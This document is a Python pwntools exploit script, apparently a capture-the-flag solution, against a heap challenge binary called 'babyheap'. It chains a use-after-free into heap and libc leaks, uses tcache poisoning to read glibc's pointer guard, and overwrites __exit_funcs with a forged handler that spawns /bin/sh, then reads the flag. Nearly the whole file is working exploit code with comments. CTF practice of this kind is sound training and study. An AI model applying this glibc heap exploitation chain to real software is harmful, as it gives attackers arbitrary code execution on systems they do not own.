#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

TARGET = './babyheap'
HOST = 'baby-heap.nc.jctf.pro'
PORT = 1337

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

#context.log_level = 'DEBUG'
gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #

def demangle(val):
  mask = 0xfff << 52
  while mask:
    # Extract the top 12-bit nibble of the encrypted value
    v = val & mask
    # XOR it shifted down by 12 into the value
    val ^= (v >> 12)
    mask >>= 12
  return val

def mangle(val, base):
  return val ^ (base >> 12)

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
  (val << r_bits%max_bits) & (2**max_bits-1) | \
  ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
  ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
  (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

# encrypt a function pointer
def encrypt(v, key):
  return rol(v ^ key, 0x11, 64)

def malloc(idx: int, payload):
  p.sendlineafter(b'> ', str(1).encode())
  p.sendlineafter(b'Index? ', str(idx).encode())
  p.sendafter(b'Content? Content? ', payload)

def free(idx: int):
  p.sendlineafter(b'> ', str(4).encode())
  p.sendlineafter(b'Index? ', str(idx).encode())

def read(idx: int):
  p.sendlineafter(b'> ', str(2).encode())
  p.sendlineafter(b'Index? ', str(idx).encode())

def update(idx: int, payload):
  p.sendlineafter(b'> ', str(3).encode())
  p.sendlineafter(b'Index? ', str(idx).encode())
  p.sendafter(b'Content? ', payload)


tmp = [b"AAAA" * 8, b"BBBB" * 8, b"CCCC" * 8, b"DDDD" * 8, b"EEEE" * 8, b"FFFF" * 8, b"GGGG" * 8, b"HHHH" * 8]

# Allocate 8 chunk #
for i in range(8):
  malloc(i, tmp[i])

# Free all the chunk in reversed order.
# So the most first chunk on heap will be placed in fastbin.
for i in range(7, -1 ,-1):
  free(i)

# Get heap leak #
read(7)
heap_leak = p.recvline()[:8]
heap_base = u64(heap_leak) << 12
print(f"heap base     : {hex(heap_base)}")

# Trigger malloc_consolidate by inputting a large 
# number to scanf() on menu prompt.
# It must be a number cause the format specifier of scanf
# on the program is %d, if we input non-number, then the 
# program will print 'Invalid input' and exit directly.
p.sendlineafter(b'> ', b'1' * 0x400)

# After large number previously, we can see fastbin now will be
# put in the smallbin, and now we can get a libc leak by reading 
# from smallbin's fd pointer.
read(0)
libc_leak = u64(p.recvline()[:8])
libc.address = libc_leak - 0x203b50
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
exit_funcs = libc.sym['__exit_funcs']
fs_base = libc.address - 0x28c0
print(f"libc base     : {hex(libc.address)}")
print(f"system        : {hex(system)}")
print(f"/bin/sh/      : {hex(binsh)}")
print(f"__exit_funcs  : {hex(exit_funcs)}")
print(f"fs_base       : {hex(fs_base)}")

# Allocate a chunk on fs_base by doing tcache poisoning
# and leak the pointer guard (which is at fs_base+0x30).
mangle_fs_base = mangle(fs_base+0x30, heap_base+0x2e0)
update(1, p64(mangle_fs_base))

malloc(8, b'TAKE 1 CHUNK OUT OF TCACHE')
# Since create_chunk() is directly asking us what value to write in the chunk, I will just input a single byte (0x41).
malloc(9, b'\x41') # value so that we know our last 1 byte of pointer_guard that we're forced to overwrite.
read(9)
pointer_guard = u64(p.recvline()[:8])
print(f"pointer_guard : {hex(pointer_guard)}")

# Do another tcache poisoning.
# This time we want to alloc in &__exit_funcs
# so we can overwrite the pointer that __exit_funcs
# currently pointing to with our crafted 
# fake exit_function_list struct on heap. 
free(1)
mangle_exit_funcs = mangle(exit_funcs, heap_base+0x2e0)
update(1, p64(mangle_exit_funcs))
malloc(10, b'TAKE 1 CHUNK OUT OF TCACHE')
# This malloc will give us allocation on __exit_funcs.
malloc(11, p64(heap_base+0x320))
# Now we craft the fake exit_function_list struct on our 
# heap at address heap_base+0x320 (which is chunk index 2).
#           next   | idx    | flavor | system()                            | arg to system() = "/bin/sh"
fake_exit = p64(0) + p64(1) + p64(4) + p64(encrypt(system, pointer_guard)) + p64(binsh)
update(2, fake_exit)

p.sendline(b'0')
p.sendline(b'ls')
p.sendline(b'cat flag.txt')

p.interactive()

# NOTE:                 
# UAF (AAR & AAW).
